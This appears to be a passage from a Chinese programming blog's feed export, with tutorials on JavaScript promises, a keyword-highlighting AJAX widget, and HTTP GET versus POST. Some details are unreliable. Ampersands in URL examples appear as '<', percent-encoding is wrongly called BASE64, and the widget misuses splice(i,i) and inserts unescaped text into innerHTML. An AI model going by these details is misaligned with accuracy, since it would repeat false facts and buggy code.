class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>jQuery.publish("done")的意思是，f1执行完成后，向"信号中心"jQuery发布"done"信号，从而引发f2的执行。</span></p><p><span>此外，f2完成执行后，也可以取消订阅（unsubscribe）。</span></p><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jQuery.unsubscribe</span>(<span class="string">&quot;done&quot;</span>, <span class="built_in">f2</span>)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>这种方法的性质与"事件监听"类似，但是明显优于后者。因为我们可以通过查看"消息中心"，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。</span></p><p><strong><span>四、Promises对象</span></strong></p><p>Promises对象是<a title="commonJS" href="http://en.wikipedia.org/wiki/CommonJS" target="_blank">CommonJS</a>工作组提出的一种规范，目的是为异步编程提供统一接口。</p><p><span>简单说，它的思想是，每一个异步任务返回一个Promise对象，该对象有一个then方法，允许指定回调函数。比如，f1的回调函数f2,可以写成：</span></p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">f1</span>()<span class="selector-class">.then</span>(f2);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>f1要进行如下改写（这里使用的是jQuery的实现）：</span></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> dfd = $.<span class="title class_">Deferred</span>();</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// f1的任务代码</span></span><br><span class="line">        dfd.<span class="title function_">resolve</span>();</span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line">    <span class="keyword">return</span> dfd.<span class="property">promise</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>这样写的优点在于，回调函数变成了链式写法，程序的流程可以看得很清楚，而且有一整套的配套方法，可以实现许多强大的功能。</span></p><p><span>比如，指定多个回调函数：</span></p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">f1</span>()<span class="selector-class">.then</span>(f2)<span class="selector-class">.then</span>(f3);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>再比如，指定发生错误时的回调函数：</span></p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">f1</span>()<span class="selector-class">.then</span>(f2)<span class="selector-class">.fail</span>(f3);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>而且，它还有一个前面三种方法都没有的好处：<span>如果一个任务已经完成，再添加回调函数，该回调函数会立即执行。</span>所以，你不用担心是否错过了某个事件或信号。<span>这种方法的缺点就是编写和理解，都相对比较难。</span></span></p><p><strong><span>五、参考链接</span></strong></p><p><span><span>*&nbsp;<a href="http://sporto.github.com/blog/2012/12/09/callbacks-listeners-promises/" rel="nofollow">Asynchronous JS: Callbacks, Listeners, Control Flow Libs and Promises</a></span></span></p><p><span><span><span>*&nbsp;</span><a href="http://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html">http://www.ruanyifeng.com/blog/2012/12/asynchronous＿javascript.html</a></span></span></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 剪贴板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 异步编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript综合应用小案例（续）</title>
      <link href="/blog/2013/05/05/cb-getKeywords-2/"/>
      <url>/blog/2013/05/05/cb-getKeywords-2/</url>
      
        <content type="html"><![CDATA[<p><a class="titlelink" href="http://www.cnblogs.com/hustskyking/archive/2013/05/04/getkeywords.html">上一篇文章</a>，弄了一个 <strong>取词&nbsp;</strong>和 <strong>标红</strong> 功能的小应用，但是存在一些bug，今天修修补补，顺便也把ajax部分补上了~</p><p><a href="http://qianduannotes.sinaapp.com/getKeyword/" target="_blank"><img src="https://images.cnitblog.com/blog/387325/201305/04235938-51987cdb332f4539bbfbeeb88d093e1c.png" alt="" width="850" height="408"></a></p><p>Demo地址：<span>：</span><a title="取词&&标红 demo" href="http://qianduannotes.sinaapp.com/getKeyword/" target="_blank">http://qianduannotes.sinaapp.com/getKeyword/</a></p><p>代码部分：</p><div class="cnblogs_Highlighter"><pre class="brush:javascript;collapse:true;;gutter:false;">var GetKeywords = {  str: "",  limit: 11,  keywords:[],  url: "./tool.php",<p>  &#x2F;&#x2F;page id<br>  getId: function(){<br>    this.id &#x3D; this._(“wp”).getAttribute(“data-page”);<br>  },</p><p>  init : function(){<br>    var box &#x3D; this._(“article”),<br>      _this &#x3D; this;</p><pre><code>//获取已经存在的关键词this.getAllKeyWord();//获取页面IDthis.getId();//让rmKeyWord函数全局化window.rmkeyWord = this.rmkeyWord;//取词事件box.onmouseup = function(evt)&#123;  var evt = evt || window.event,    target = evt.target || evt.srcElement;  //如果鼠标是在button上弹起，则忽略  if(target.id == &quot;btn&quot;) return;  GetKeywords.str = _this.getSelectionText();  if(_this.str.length == 0)&#123;    _this.removeBtn();    return;  &#125;  if(_this._(&quot;btn&quot;)) &#123;    _this.removeBtn();    if(GetKeywords.str == &quot;&quot;) return;    _this.createBtn(evt);    return;  &#125;  _this.createBtn(evt);&#125;var types = document.getElementsByTagName(&quot;input&quot;);for(var j = 0, len = types.length; j &amp;lt; len; j++)&#123;  (function(j)&#123;    types[j].onchange = function()&#123;      _this.sendData(j + 1, &quot;change&quot;);    &#125;  &#125;)(j);&#125;</code></pre><p>  },</p><p>  &#x2F;&#x2F;工具函数<br>  _: function(obj){<br>    return document.getElementById(obj);<br>  },</p><p>  &#x2F;&#x2F;获取选中文本<br>  getSelectionText: function(){<br>    if(window.getSelection) {<br>      return window.getSelection().toString();<br>    } else if(document.selection &amp;&amp; document.selection.createRange) {<br>      return document.selection.createRange().text;<br>    }<br>    return ‘’;<br>  },</p><p>  &#x2F;&#x2F;创建按钮<br>  createBtn: function(evt){<br>    var button &#x3D; document.createElement(“div”),<br>      evt &#x3D; evt || window.event,<br>      x &#x3D; evt.pageX || evt.x,<br>      y &#x3D; evt.pageY || evt.y,<br>      i, j, len,<br>      cssList &#x3D; “”,<br>      _this &#x3D; this,<br>      csses &#x3D; {<br>        “height” : “30px”,<br>        “line-height” : “30px”,<br>        “position”: “absolute”,<br>        “top”: y + 10 + “px”,<br>        “left”: x + 10 + “px”,<br>        “cursor”: “pointer”,<br>        “border”: “1px solid #000”,<br>        “background”: “#EEE”,<br>        “padding”: “2px 8px”,<br>        “border-radius”: “3px”<br>      };<br>    for(i in csses){<br>      if(csses.hasOwnProperty(i)){<br>        cssList +&#x3D; i + “:” + csses[i] + “;”;<br>      }<br>    }<br>    button.style.cssText &#x3D; cssList;<br>    button.innerHTML &#x3D; “添加到关键词列表”;<br>    button.setAttribute(“id”, “btn”);</p><pre><code>this._(&quot;article&quot;).appendChild(button);button.onclick = function()&#123;  if(_this.str.length &amp;gt; _this.limit)&#123;    alert(&quot;关键词长度最长为11，可以通过设置GetKeywords.limit来控制长度。&quot;);    _this.removeBtn();    return;  &#125;  for(j = 0, len = GetKeywords.keywords.length; j &amp;lt; len; j++)&#123;    if(GetKeywords.keywords[j] == _this.str)&#123;      alert(&quot;已经存在该关键词了~&quot;);      _this.removeBtn();      return;    &#125;    continue;  &#125;  _this.sendData(_this.str);  _this.keywords.push(_this.str);  _this.setRed(_this.str);  _this.addTo();  _this.removeBtn();&#125;;</code></pre><p>  },</p><p>  &#x2F;&#x2F;删除按钮<br>  removeBtn: function(){<br>    var btn &#x3D; this._(“btn”);<br>    btn.parentNode.removeChild(btn);<br>  },</p><p>  &#x2F;&#x2F;加入到关键词里列表<br>  addTo: function(){<br>    var word &#x3D; this._(“wordList”);<br>    word.innerHTML +&#x3D; “&lt;span&gt;&lt;font&gt;” + this.str + “&lt;&#x2F;font&gt;&lt;a href&#x3D;’#’ onclick&#x3D;’rmkeyWord(this);’&gt;&lt;&#x2F;a&gt;&lt;&#x2F;span&gt;”;<br>  },</p><p>  &#x2F;&#x2F;关键词标红<br>  setRed: function(str){<br>    var content &#x3D; this._(“article”),<br>      temp &#x3D; ‘(‘ + str + ‘)’;<br>      reg &#x3D; new RegExp(temp,’g’);</p><pre><code>content.innerHTML = content.innerHTML.replace(reg, &quot;&amp;lt;span style=&#39;color:red;&#39;&amp;gt;$1&amp;lt;/span&amp;gt;&quot;);</code></pre><p>  },</p><p>  &#x2F;&#x2F;删除标红<br>  rmRed: function(str){<br>    var content &#x3D; this._(“article”),<br>      temp &#x3D; “(&lt;span[^&lt;]*” + str + “&lt;&#x2F;span&gt;)”;<br>      reg &#x3D; new RegExp(temp,’gi’);<br>    content.innerHTML &#x3D; content.innerHTML.replace(reg, str);<br>  },</p><p>  &#x2F;&#x2F;获取已经存在的关键词（也可以用来获取所有关键词）<br>  getAllKeyWord: function (){<br>    var spans &#x3D; this._(“wordList”).getElementsByTagName(“span”),<br>      key &#x3D; [], i &#x3D; 0, len;<br>    for(len &#x3D; spans.length; i &lt; len; i++){<br>      var font &#x3D; spans[i].getElementsByTagName(“font”)[0];<br>      var temp &#x3D; font.innerText || font.textContent;<br>      this.setRed(temp);<br>      key.push(temp);<br>    }<br>    this.keywords &#x3D; key;<br>  },</p><p>  &#x2F;&#x2F;删除关键词<br>  rmkeyWord: function (obj){<br>    var target &#x3D; obj.parentNode,<br>      word &#x3D; obj.previousSibling.innerHTML,<br>      i &#x3D; 0, len;</p><pre><code>res = GetKeywords.sendData(word, &quot;del&quot;);GetKeywords.rmRed(word);for(len = GetKeywords.keywords.length; i &amp;lt; len; i++)&#123;  if(GetKeywords.keywords[i] == word)&#123;    GetKeywords.keywords.splice(i,i);  &#125;  continue;&#125;target.parentNode.removeChild(target);var evt = arguments.callee.caller.arguments[0];try&#123;  evt.preventDefault();&#125;catch(e)&#123;  window.event.returnValue = false;&#125;</code></pre><p>  },</p><p>  &#x2F;&#x2F;ajax<br>  sendData: function(data, action){<br>    var xmlhttp,<br>      action &#x3D; action || “add”,<br>      _this &#x3D; this;<br>    if (window.XMLHttpRequest){<br>      xmlhttp &#x3D; new XMLHttpRequest();<br>    }else{<br>      xmlhttp &#x3D; new ActiveXObject(“Microsoft.XMLHTTP”);<br>    }<br>    xmlhttp.open(“GET”, this.url + “?” + action + “&#x3D;” + data + “&lt;id&#x3D;” + this.id, true);<br>    xmlhttp.onreadystatechange &#x3D; function(){<br>      if (xmlhttp.readyState &#x3D;&#x3D; 4 &amp;&amp; xmlhttp.status &#x3D;&#x3D; 200){<br>        _this.sendSuccess(xmlhttp.responseText);<br>      }<br>    }<br>    xmlhttp.send();</p><p>  },</p><p>  sendSuccess:function(data){<br>    window.console &amp;&amp; window.console.log &amp;&amp; window.console.log(data);<br>  }<br>}</p><p>GetKeywords.init();<br></pre></p></div><p>　　</p><p><strong>一、ajax部分</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">sendData</span>: <span class="keyword">function</span>(<span class="params">data, action</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp,</span><br><span class="line">        action = action || <span class="string">&quot;add&quot;</span>,</span><br><span class="line">        _this = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)&#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="variable language_">this</span>.<span class="property">url</span> + <span class="string">&quot;?&quot;</span> + action + <span class="string">&quot;=&quot;</span> + data + <span class="string">&quot;&lt;id=&quot;</span> + <span class="variable language_">this</span>.<span class="property">id</span>, <span class="literal">true</span>);</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">            _this.<span class="title function_">sendSuccess</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>();</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="attr">sendSuccess</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">console</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">console</span>.<span class="property">log</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>感觉这里真心就没什么好说的，因为这玩意儿涉及到数据的提交、删除、和更新，所以GET的状态也分为add、del、change。</p><p>默认的提交状态是add，代码中已经标红。</p><p><strong>二、删除关键词</strong></p><p>上次也说了这个部分，但是里边用到了一个splice，在这里稍微详细描述下。</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">rmkeyWord: <span class="keyword">function</span> (obj)&#123;</span><br><span class="line">    var target = obj.parentNode,</span><br><span class="line">        word = obj.previousSibling.innerHTML,</span><br><span class="line">        i = <span class="number">0</span>, len;</span><br><span class="line"></span><br><span class="line">    res = <span class="module-access"><span class="module"><span class="identifier">GetKeywords</span>.</span></span>send<span class="constructor">Data(<span class="params">word</span>, <span class="string">&quot;del&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">GetKeywords</span>.</span></span>rm<span class="constructor">Red(<span class="params">word</span>)</span>;</span><br><span class="line">    <span class="keyword">for</span>(len = <span class="module-access"><span class="module"><span class="identifier">GetKeywords</span>.</span></span>keywords.length; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="module-access"><span class="module"><span class="identifier">GetKeywords</span>.</span></span>keywords<span class="literal">[<span class="identifier">i</span>]</span><span class="operator"> == </span>word)&#123;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">GetKeywords</span>.</span></span>keywords.splice(i,i); <span class="comment">//删除第i个元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line">    target.parentNode.remove<span class="constructor">Child(<span class="params">target</span>)</span>;</span><br><span class="line">    var evt = arguments.callee.caller.arguments<span class="literal">[<span class="number">0</span>]</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        evt.prevent<span class="constructor">Default()</span>;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        window.event.returnValue = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>splice() 方法用于插入、删除或替换数组的元素。</span></p><p><span><span>这个方法可删除从 index 处开始的零个或多个元素，并且用参数列表中声明的一个或多个值来替换那些被删除的元素。</span></span></p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">array</span>Object.splice(index,howmany,element1,.....,elementX)</span><br><span class="line"></span><br></pre></td></tr></table></figure><table class="dataintable"><tbody><tr><th>参数</th><th>描述</th></tr><tr><td>index</td><td><p>必需。规定从何处添加/删除元素。</p><p>该参数是开始插入和（或）删除的数组元素的下标，必须是数字。</p></td></tr><tr><td>howmany</td><td><p>必需。规定应该删除多少元素。必须是数字，但可以是 "0"。</p><p>如果未规定此参数，则删除从 index 开始到原数组结尾的所有元素。</p></td></tr><tr><td>element1</td><td>可选。规定要添加到数组的新元素。从 index 所指的下标处开始插入。</td></tr><tr><td>elementX</td><td>可选。可向数组添加若干元素。</td></tr></tbody></table><p>1）插入</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ArrayObj</span>.splice(<span class="number">2</span>, <span class="number">0</span>, <span class="string">&quot;addObj&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即为在数组第三个位置插入一个名为\addObj"的字符串。</p><p>2）删除</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ArrayObj</span>.splice(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即为删除从第三个开始的连续两个数组元素。</p><p>3）插入</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ArrayObj</span>.splice(<span class="number">2</span>, <span class="number">1</span>，<span class="string">&quot;replaceObj&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即为替换第三个元素（也可以说是删除从第三个元素开始的连续一个元素，然后添加一个名为\replaceObj"的字符串）。</p><p>来一个综合应用的：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ArrayObj</span>.splice(<span class="number">2</span>, <span class="number">2</span>，<span class="string">&quot;replaceObj_1&quot;</span>，<span class="string">&quot;replaceObj_2&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;即为删除从第三个元素开始的连续两个元素，然后在刚才删除的位置，添加名为\replaceObj_1"，\replaceObj_2"的两个字符串。相信应该已经比较清楚了吧~O(&cap;_&cap;)O~</p><p><em>注：splice() 方法与 slice() 方法的作用是不同的，splice() 方法会直接对数组进行修改。</em></p><p><strong>三、遇到的问题</strong></p><p><strong>1. this指定的对象</strong></p><p>对象方法中this并不一定指向对象本身，即使写了</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">f: <span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _this = <span class="keyword">this</span>; <span class="comment">//然后在闭包中使用_this</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">name</span><span class="params">()</span>&#123;</span><br><span class="line">        _this.doSomething();<span class="comment">//这是的_this也不一定是对象本身</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是_this也不一定是指向该对象，[object global]，有可能指向的是这个对象~</p><p><strong>2. event的兼容性</strong></p><p>相信evt = evt || window.event，大家都明白，但是在FF下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">evt</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> evt = evt || <span class="variable language_">window</span>.<span class="property">event</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在调用test()的时候，如果没有加参数，evt为undefined，使用过程需要test(evt);当然也可以这样:</p><figure class="highlight gml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> test()&#123;</span><br><span class="line">    <span class="keyword">var</span> evt = <span class="variable language_">argument</span>.callee.caller.<span class="variable language_">argument</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>4. for-in的问题</strong></p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">for<span class="comment">(i in csses)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span><span class="comment">(csses.hasOwnProperty(i)</span>)&#123;</span><br><span class="line">        cssList += i + <span class="string">&quot;:&quot;</span> + csses[i] + <span class="string">&quot;;&quot;</span>;　　　　 <span class="comment">//button.style[i] = csses[i];　　 &#125; &#125; button.style.cssText = cssList;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开始的时候，我用的是注释里的方法button.style[i] = csses[i]，但在IE下报错了，后来就用的上面方式实现，具体为什么我也不知道。。</p><p><strong>5. 标签解析的问题</strong></p><p>IE载入DOM之后，会把所有的标签解析成大写的，这个至少在IE7和8是如此，IE9以上没测试，就不知道了~</p><p><strong>6. JS一些常见的浏览器兼容问题</strong></p><p>这里提到的有：</p><ul><li>evt || window.event</li><li>evt.target || evt.srcElement</li><li>evt.x || evt.pageX || evt.layerX</li><li>evt.preventDefault() Vs window.event.returnValue = false</li><li>XMLHttpRequest ||&nbsp;ActiveXObject("Microsoft.XMLHTTP")</li><li>obj.innerText || obj.textContent</li><li>window.getSelection ||　document.selection</li></ul><p><strong>四、参考</strong></p><ul><li><a title="splice" href="http://www.w3school.com.cn/js/jsref_splice.asp" target="_blank">W3School splice</a></li></ul><p><strong>五、结语</strong></p><p><strong>我</strong>认为，对象里的数据，能单独提取出来尽量单独提出来，不要把所有的常量都当做字面量放置在有需求的地方，用一个变量缓存的话，修改起来也十分方便。对象里的方法，能分离的分离，尽量不要一个嵌套着一个，搞不好就是一个泄露内存的闭包，分离出来，作为对象的直接方法，既可以方便多次利用，又不至于搞的太复杂。</p><p>好吧，要学的东西真的很多很多，但是只要把看到的不明白弄明白，然后准备好下一个不明白到来，这样就行了。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈HTTP中Get与Post的区别</title>
      <link href="/blog/2013/05/05/cb-get-and-post/"/>
      <url>/blog/2013/05/05/cb-get-and-post/</url>
      
        <content type="html"><![CDATA[<p>　Http定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE。URL全称是资源描述符，我们可以这样认为：一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的<span>查，改，增，删</span>4个操作。到这里，大家应该有个大概的了解了，GET一般用于<span>获取/查询</span>资源信息，而POST一般用于<span>更新</span>资源信息。</p><p>　　<span><strong>1</strong>.根据HTTP规范，GET用于信息获取，而且应该是安全的和幂等的。</span></p><p>　　(1).所谓安全的意味着该操作用于获取信息而非修改信息。换句话说，GET 请求一般不应产生副作用。就是说，它仅仅是获取资源信息，就像数据库查询一样，不会修改，增加数据，不会影响资源的状态。</p><p>　　<em>&nbsp;注意：这里安全的含义仅仅是指是非修改信息。</em></p><p>　　(2).幂等的意味着对同一URL的多个请求应该返回同样的结果。这里我再解释一下<span><strong>幂等</strong></span>这个概念：</p><figure class="highlight plaintext"><figcaption><span>幂等有一下几种定义：　　对于单目运算，如果一个运算对于在范围内的所有的一个数多次进行该运算所得的结果和进行一次该运算所得的结果是一样的，那么我们就称该运算是幂等的。比如绝对值运算就是一个例子，在实数集中，有abs(a)</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>看完上述解释后，应该可以理解GET幂等的含义了。</p><p>　　但在实际应用中，以上2条规定并没有这么严格。引用别人文章的例子：比如，新闻站点的头版不断更新。虽然第二次请求会返回不同的一批新闻，该操作仍然被认为是安全的和幂等的，因为它总是返回当前的新闻。从根本上说，如果目标是当用户打开一个链接时，他可以确信从自身的角度来看没有改变资源即可。</p><p>　　<span><strong>2</strong>.根据HTTP规范，POST表示可能修改变服务器上的资源的请求。</span>继续引用上面的例子：还是新闻以网站为例，读者对新闻发表自己的评论应该通过POST实现，因为在评论提交后站点的资源已经不同了，或者说资源被修改了。</p><p>　　上面大概说了一下HTTP规范中GET和POST的一些原理性的问题。但在实际的做的时候，很多人却没有按照HTTP规范去做，导致这个问题的原因有很多，比如说：</p><p>　　<span><strong>1</strong></span>.很多人贪方便，更新资源时用了GET，因为用POST必须要到FORM（表单），这样会麻烦一点。</p><p>　　<span><strong>2</strong></span>.对资源的增，删，改，查操作，其实都可以通过GET/POST完成，不需要用到PUT和DELETE。</p><p>　　<span><strong>3</strong></span>.另外一个是，早期的Web MVC框架设计者们并<span>没有有意识地将URL当作抽象的资源来看待和设计</span>，所以导致一个比较严重的问题是传统的Web MVC框架基本上都只支持GET和POST两种HTTP方法，而不支持PUT和DELETE方法。</p><p>&nbsp;　　<em>简单解释一下MVC：MVC本来是存在于Desktop程序中的，M是指数据模型，V是指用户界面，C则是控制器。使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表现形式。</em></p><p>　　以上3点典型地描述了老一套的风格（没有严格遵守HTTP规范），随着架构的发展，现在出现REST(Representational State Transfer)，一套支持HTTP规范的新风格，这里不多说了，可以参考《RESTful Web Services》。</p><p>　　说完原理性的问题，我们再从<span>表面现像上面看看GET和POST的区别</span>：</p><p>　　<span><strong>1</strong></span>.GET请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，参数之间以<相连，如：login.action?name=hyddd<password=idontknow<verify=%E4%BD%A0%E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如：%E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。</p><p>　　POST把提交的数据则放置在是HTTP包的包体中。</p><p>　　<span><strong>2</strong></span>."GET方式提交的数据最多只能是1024字节，理论上POST没有限制，可传较大量的数据，IIS4中最大为80KB，IIS5中为100KB"？？！</p><p>　　以上这句是我从其他文章转过来的，其实这样说是错误的，不准确的：</p><p>　　(1).首先是"GET方式提交的数据最多只能是1024字节"，因为GET是通过URL提交数据，那么GET可提交的数据量就跟URL的长度有直接关系了。而实际上，<span>URL不存在参数上限的问题，HTTP协议规范没有对URL长度进行限制</span>。这个限制是特定的浏览器及服务器对它的限制。IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系统的支持。</p><p>　　注意这是限制是整个URL长度，而不仅仅是你的参数值数据长度。[见参考资料5]</p><p>　　(2).理论上讲，<span>POST是没有大小限制的，HTTP协议规范也没有进行大小限制</span>，说\POST数据量存在80K/100K的大小限制"是不准确的，POST数据是没有限制的，起限制作用的是服务器的处理程序的处理能力。</p><p>　　对于ASP程序，Request对象处理每个表单域时存在100K的数据长度限制。但如果使用Request.BinaryRead则没有这个限制。</p><p>　　由这个延伸出去，对于IIS 6.0，微软出于安全考虑，加大了限制。我们还需要注意：</p><p>　　　　 1).IIS 6.0默认ASP POST数据量最大为200KB，每个表单域限制是100KB。　　　　 2).IIS 6.0默认上传文件的最大大小是4MB。　　　　 3).IIS 6.0默认最大请求头是16KB。　　IIS 6.0之前没有这些限制。[见参考资料5]</p><p>　　所以上面的80K，100K可能只是默认值而已(注：关于IIS4和IIS5的参数，我还没有确认)，但肯定是可以自己设置的。由于每个版本的IIS对这些参数的默认值都不一样，具体请参考相关的IIS配置文档。</p><p>　　<span><strong>3</strong></span>.在ASP中，服务端获取GET请求参数用Request.QueryString，获取POST请求参数用Request.Form。在JSP中，用request.getParameter(\"XXXX\")来获取，虽然jsp中也有request.getQueryString()方法，但使用起来比较麻烦，比如：传一个test.jsp?name=hyddd<password=hyddd，用request.getQueryString()得到的是：name=hyddd<password=hyddd。在PHP中，可以用$_GET和$_POST分别获取GET和POST中的数据，而$_REQUEST则可以获取GET和POST两种请求中的数据。值得注意的是，JSP中使用request和PHP中使用$_REQUEST都会有隐患，这个下次再写个文章总结。</p><p>　　<span><strong>4</strong></span>.POST的安全性要比GET的安全性高。注意：这里所说的安全性和上面GET提到的\安全"不是同个概念。上面\安全"的含义仅仅是不作数据修改，而这里安全的含义是真正的Security的含义，比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存，(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击。</p><p>　　总结一下，<span>Get</span>是向服务器发索取数据的一种<span>请求</span>，而<span>Post</span>是向服务器提交数据的一种<span>请求</span>，在FORM（表单）中，Method默认为"GET"，实质上，GET和POST只是发送机制不同，并不是一个取一个发！</p><p><strong>参考资料</strong>：</p><p>[1].http://hi.baidu.com/liuzd003/blog/item/7bfecbfa6ea94ed8b58f318c.html</p><p>[2].http://www.blogjava.net/onlykeke/archive/2006/08/23/65285.aspx</p><p>[3].http://baike.baidu.com/view/2067025.htm</p><p>[5].http://blog.csdn.net/somat/archive/2004/10/29/158707.aspx</p><p>本文转自：<a href="http://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html" target="_blank">hyddd</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络交互 </category>
          
          <category> 剪贴板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript综合应用小案例</title>
      <link href="/blog/2013/05/04/cb-getkeywords/"/>
      <url>/blog/2013/05/04/cb-getkeywords/</url>
      
